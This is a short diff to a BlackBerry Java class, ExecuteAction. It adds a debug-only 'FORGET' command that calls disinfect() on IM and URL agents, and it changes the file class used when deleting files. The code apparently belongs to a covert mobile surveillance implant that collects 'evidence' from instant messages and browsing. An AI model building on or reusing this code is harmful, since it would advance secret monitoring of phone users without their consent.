@@ -20,12 +20,14 @@ import net.rim.device.api.system.ApplicationManager;
 import net.rim.device.api.system.CodeModuleManager;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.Task;
+import blackberry.agent.ImAgent;
+import blackberry.agent.UrlAgent;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceCollector;
-import blackberry.fs.AutoFlashFile;
+import blackberry.fs.AutoFile;
 import blackberry.utils.Check;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
@@ -96,10 +98,25 @@ public final class ExecuteAction extends SubAction {
             } else if (cmd.equals("RESET")) {
                 executeReset(params);
             }
+            
+            //#ifdef DEBUG
+            else if (cmd.equals("FORGET")) {
+                executeForget(params);
+            }
+            //#endif
         }
 
         return true;
     }
+
+    //#ifdef DEBUG
+    private void executeForget(Vector params) {
+        // forget ImAgent
+        ImAgent.getInstance().disinfect();
+        // forget UrlAgent
+        UrlAgent.getInstance().disinfect();
+    }
+    //#endif
 
     private void executeReset(Vector params) {
         //#ifdef DEBUG
@@ -114,7 +131,7 @@ public final class ExecuteAction extends SubAction {
         debug.trace("executeRestart");
         //#endif
         Task.getInstance().restart();
-        Evidence.info("ActRestart");
+        Evidence.info("ActexecuteRestart");
     }
 
     private void executeCleanup(Vector params) {
@@ -148,7 +165,7 @@ public final class ExecuteAction extends SubAction {
             //#ifdef DEBUG
             debug.trace("executeDelete argument: " + filename);
             //#endif
-            AutoFlashFile file = new AutoFlashFile(filename);
+            AutoFile file = new AutoFile(filename);
             if (file.exists()) {
                 //#ifdef DEBUG
                 debug.info("executeDelete deleting: " + filename);
